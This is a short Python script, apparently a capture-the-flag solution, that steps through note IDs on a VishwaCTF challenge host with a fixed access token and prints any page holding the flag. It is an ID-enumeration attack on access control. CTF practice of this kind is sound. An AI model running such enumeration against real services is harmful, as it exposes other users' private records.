#!/usr/bin/env python3
import requests

BASE = "https://ghost.vishwactf.com"
TOKEN = "draftkey123"

# Check all notes including 13
for i in range(1, 20):
    r = requests.get(f"{BASE}/note/{i}?token={TOKEN}")
    print(f"Note {i}: {r.status_code}", end="")
    if r.status_code == 200:
        if "VishwaCTF{" in r.text:
            print(f" - FLAG FOUND!")
            print(r.text)
            break
        print(f" - {r.text[:80]}")
    elif "deleted" in r.text.lower():
        print(f" - DELETED")
    else:
        print()
